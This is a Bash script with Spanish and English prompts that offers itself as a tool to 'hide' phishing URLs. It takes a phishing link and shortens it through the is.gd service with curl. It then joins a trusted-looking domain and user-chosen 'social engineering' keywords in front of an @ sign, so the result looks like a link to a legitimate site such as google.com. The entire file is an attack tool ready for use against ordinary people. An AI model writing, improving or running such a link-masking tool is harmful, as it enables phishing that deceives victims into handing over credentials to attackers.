# Bash Script for Hide Phishing URL Created by KP

url_checker() {
    if [ ! "${1//:*}" = http ]; then
        if [ ! "${1//:*}" = https ]; then
            echo -e "\e[31m[!] Invalid URL. Please use http or https.\e[0m"
            exit 1
        fi
    fi
}

echo -e "\e[1;35;37m███████╗ █████╗ ██╗  ██╗███████╗  \e[0m"   
echo -e "\e[1;35;37m██╔════╝██╔══██╗██║ ██╔╝██╔════╝  \e[0m"
echo -e "\e[1;35;37m█████╗  ███████║█████╔╝ █████╗    \e[0m"
echo -e "\e[1;35;37m██╔══╝  ██╔══██║██╔═██╗ ██╔══╝    \e[0m"
echo -e "\e[1;35;37m██║     ██║  ██║██║  ██╗███████╗  \e[0m"
echo -e "\e[1;35;37m╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝  \e[0m"
echo -e "\e[1;35;37m   ██    ██ ██████  ██            \e[0m"
echo -e "\e[1;35;37m   ██    ██ ██   ██ ██            \e[0m"
echo -e "\e[1;35;37m   ██    ██ ██████  ██            \e[0m"
echo -e "\e[1;35;37m   ██    ██ ██   ██ ██            \e[0m"
echo -e "\e[1;35;37m    ██████  ██   ██ ███████       \e[0m"
echo -e "\e[1;35;37m By:         Norahc               \e[0m"                                              
echo -e "\e[1;35;37m ### Mascara de URL ###\e[0m \n"
echo -n "Pegué la URL a Suplantar (Con http o https): "
read phish
url_checker $phish
sleep 1
echo "Processing and Modifing Phishing URL"
echo ""
short=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${phish})
shorter=${short#https://}
echo -e "\n\e[1;35;37m ### Masking Domain ###\e[0m"
echo 'Dominio para enmascarar la URL (with http or https), ex: https://google.com, http
://anything.org) :'
echo -en "\e[32m=>\e[0m "
read mask
url_checker $mask
echo -e '\nPalabras de ingeniería Social:(like free-money, best-pubg-tricks)'
echo -e "\e[31mNo usar Espacios solo usa '-' Entre las palabras claves\e[0m"
echo -en "\e[32m=>\e[0m "
read words
echo -e "\nGenerating MaskPhish Link...\n"
final=$mask-$words@$shorter
echo -e "Aquí esta la URL camuflada:\e[32m ${final} \e[0m\n"
